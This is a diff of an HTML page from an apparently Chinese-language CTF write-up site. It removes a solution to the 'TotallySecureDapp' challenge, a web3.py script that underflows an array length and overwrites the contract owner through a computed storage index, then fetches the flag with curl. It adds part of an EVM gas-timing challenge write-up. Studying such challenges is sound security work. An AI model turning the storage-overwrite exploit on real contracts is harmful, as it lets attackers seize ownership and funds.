-<span class="n">contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">contract_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">abi</span><span class="p">)</span>
-
-<span class="c1"># 先调用 removePost 使数组长度下溢出</span>
-<span class="n">tx</span> <span class="o">=</span> <span class="n">contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">removePost</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">buildTransaction</span><span class="p">({</span><span class="s2">&quot;from&quot;</span><span class="p">:</span> <span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="s2">&quot;nonce&quot;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">getTransactionCount</span><span class="p">(</span><span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">)})</span>
-<span class="n">signed_tx</span> <span class="o">=</span> <span class="n">account</span><span class="o">.</span><span class="n">signTransaction</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">sendRawTransaction</span><span class="p">(</span><span class="n">signed_tx</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
-
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>  <span class="c1"># 等待交易确认</span>
-
-<span class="c1"># 修改 owner</span>
-<span class="n">index</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">256</span> <span class="o">-</span> <span class="nb">int</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">soliditySha3</span><span class="p">([</span><span class="s1">&#39;uint256&#39;</span><span class="p">],</span> <span class="p">[</span><span class="mi">3</span><span class="p">])</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span>
-<span class="n">tx</span> <span class="o">=</span> <span class="n">contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">editPost</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="s2">&quot;unimportant&quot;</span><span class="p">,</span> <span class="s2">&quot;unimportant&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">buildTransaction</span><span class="p">({</span><span class="s2">&quot;from&quot;</span><span class="p">:</span> <span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="s2">&quot;nonce&quot;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">getTransactionCount</span><span class="p">(</span><span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">)})</span>
-<span class="n">signed_tx</span> <span class="o">=</span> <span class="n">account</span><span class="o">.</span><span class="n">signTransaction</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">sendRawTransaction</span><span class="p">(</span><span class="n">signed_tx</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
-
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>
-
-<span class="c1"># emit FlagCaptured</span>
-<span class="n">tx</span> <span class="o">=</span> <span class="n">contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">captureFlag</span><span class="p">()</span><span class="o">.</span><span class="n">buildTransaction</span><span class="p">({</span><span class="s2">&quot;from&quot;</span><span class="p">:</span> <span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="s2">&quot;nonce&quot;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">getTransactionCount</span><span class="p">(</span><span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">)})</span>
-<span class="n">signed_tx</span> <span class="o">=</span> <span class="n">account</span><span class="o">.</span><span class="n">signTransaction</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">sendRawTransaction</span><span class="p">(</span><span class="n">signed_tx</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
-</code></pre></div>
-</li>
-<li>
-<p><a href="https://ropsten.etherscan.io/address/0x014a2a17aa06c26c660fb4a269ac87849d38fd0a#events">TotallySecureDapp | Address 0x014a2a17aa06c26c660fb4a269ac87849d38fd0a | Etherscan</a> 可以看到 <code>FlagCaptured</code> 事件被成功触发了，但是 Flag 在哪？</p>
-</li>
-<li>
-<p>起初以为是事件的返回值，但查日志也最多只能获得传参。想到是 Web 题，跑去翻了翻源码，发现 <code>pages/api/secret.ts</code> 中提供了获取 Flag 的接口，请求参数包括 <code>userAddress</code>、<code>contractAddress</code> 以及 <code>userId</code></p>
-<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">contractAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">userId</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="nx">ReqData</span><span class="p">;</span><span class="w"></span>
-</code></pre></div>
-<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">_owner</span><span class="p">();</span><span class="w"></span>
-<span class="kd">const</span><span class="w"> </span><span class="nx">flagCaptured</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">_flagCaptured</span><span class="p">();</span><span class="w"></span>
-<span class="kd">const</span><span class="w"> </span><span class="nx">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">provider</span><span class="p">.</span><span class="nx">getBalance</span><span class="p">(</span><span class="nx">contractAddress</span><span class="p">);</span><span class="w"></span>
-<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">owner</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nx">userAddress</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">flagCaptured</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">balance</span><span class="p">.</span><span class="nx">gt</span><span class="p">(</span><span class="nx">parseEther</span><span class="p">(</span><span class="s1">&#39;0.005&#39;</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">ids</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">collection</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">).</span><span class="nx">doc</span><span class="p">(</span><span class="s1">&#39;ids&#39;</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">ids</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Failed to load ids&#39;</span><span class="w"> </span><span class="p">});</span><span class="w"></span>
-<span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">recall</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint16</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">256</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">--</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// i 减到 -1 会导致 revert</span><span class="w"></span>
+<span class="w">            </span><span class="nx">n</span><span class="w"> </span><span class="o">&lt;&lt;=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">            </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">g</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">();</span><span class="w"></span>
+<span class="w">            </span><span class="nx">access</span><span class="p">[</span><span class="nx">i</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">];</span><span class="w"></span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">g</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">1000</span><span class="p">)</span><span class="w"> </span><span class="nx">n</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">n</span><span class="p">;</span><span class="w"></span>
 <span class="w">    </span><span class="p">}</span><span class="w"></span>
-<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">ids</span><span class="p">.</span><span class="nx">get</span><span class="p">()).</span><span class="nx">get</span><span class="p">(</span><span class="nx">userAddress</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">());</span><span class="w"></span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">id</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="nx">userId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">401</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Unauthorised&#39;</span><span class="w"> </span><span class="p">});</span><span class="w"></span>
-<span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="p">}</span><span class="w"></span>
-<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">200</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">flag</span><span class="o">:</span><span class="w"> </span><span class="kt">flag</span><span class="w"> </span><span class="p">});</span><span class="w"></span>
-<span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
 <span class="p">}</span><span class="w"></span>
 </code></pre></div>
 </li>
 <li>
-<p>合约相关的条件都已满足，还差一个 <code>userId</code>，搜了搜源码，在 <code>components/connector/ConnectModal.tsx</code> 下找到了</p>
-<div class="highlight"><pre><span></span><code>window.localStorage.setItem(&#39;user-id&#39;, id);
-</code></pre></div>
-</li>
-<li>
-<p>在控制台输入 <code>localStorage.getItem('user-id')</code> 即可获得对应账户的 <code>userId</code></p>
-</li>
-<li>
-<p>调用 API 接口</p>
-<div class="highlight"><pre><span></span><code>$ curl -d <span class="s1">&#39;{&quot;userAddress&quot;:&quot;0xe09f6d20E2522F6B971b4516744946CF17BE8432&quot;, &quot;contractAddress&quot;:&quot;0x014A2a17AA06C26C660FB4A269aC87849d38Fd0A&quot;, &quot;userId&quot;: &quot;RIHIaESfxzilmF10mmBpH&quot;}&#39;</span> -H <span class="s2">&quot;Content-Type: application/json&quot;</span> -X POST https://totally-secure-dapp.vercel.app/api/secret
-<span class="o">{</span><span class="s2">&quot;flag&quot;</span>:<span class="s2">&quot;UACTF{23411y_m394_5u5_f149}&quot;</span><span class="o">}</span>
-</code></pre></div>
+<p>状态回滚包括地址和存储位置的冷热状态</p>
 </li>
 </ul>
-<h3 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h3>
+<h4 id="flag_2">Flag<a class="headerlink" href="#flag_2" title="Permanent link">&para;</a></h4>
 <blockquote>
-<p>UACTF{23411y_m394_5u5_f149}</p>
+<p>flag{EVM_1s_c0mPl1c4ted_bUt_Rea11y_FuN_T0_d1g_Deeper_9d3b7f6932}</p>
 </blockquote>
+<h4 id="_9">参考资料<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h4>
+<ul>
+<li><a href="https://eips.ethereum.org/EIPS/eip-2929">EIP-2929: Gas cost increases for state access opcodes</a></li>
+<li><a href="https://github.com/wolflo/evm-opcodes/blob/main/gas.md">Appendix - Dynamic Gas Costs</a></li>
+</ul>
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:gascap">
+<p><a href="https://geth.ethereum.org/docs/interface/command-line-options">Command-line Options | Go Ethereum</a>&#160;<a class="footnote-backref" href="#fnref:gascap" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+<li id="fn:gas">
+<p><a href="https://www.evm.codes/#5a?fork=merge">EVM Codes - An Ethereum Virtual Machine Opcodes Interactive Reference</a>&#160;<a class="footnote-backref" href="#fnref:gas" title="Jump back to footnote 2 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">September 11, 2022 15:27:30</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">December 19, 2022 00:22:49</span>
       
     
   </small>
@@ -2918,7 +3240,7 @@
     <nav class="md-footer__inner md-grid" aria-label="页脚" >
       
         
-        <a href="../code_is_law/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Code is Law" rel="prev">
+        <a href="../private_log/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Private Log" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
           </div>
@@ -2927,20 +3249,20 @@
               <span class="md-footer__direction">
                 上一页
               </span>
-              Code is Law
+              Private Log
             </div>
           </div>
         </a>
       
       
         
-        <a href="../cairo_reverse/" class="md-footer__link md-footer__link--next" aria-label="下一页: Cairo Reverse" rel="next">
+        <a href="../../wargames/natas/" class="md-footer__link md-footer__link--next" aria-label="下一页: Natas" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 下一页
               </span>
-              Cairo Reverse
+              Natas
             </div>
           </div>
           <div class="md-footer__button md-icon">
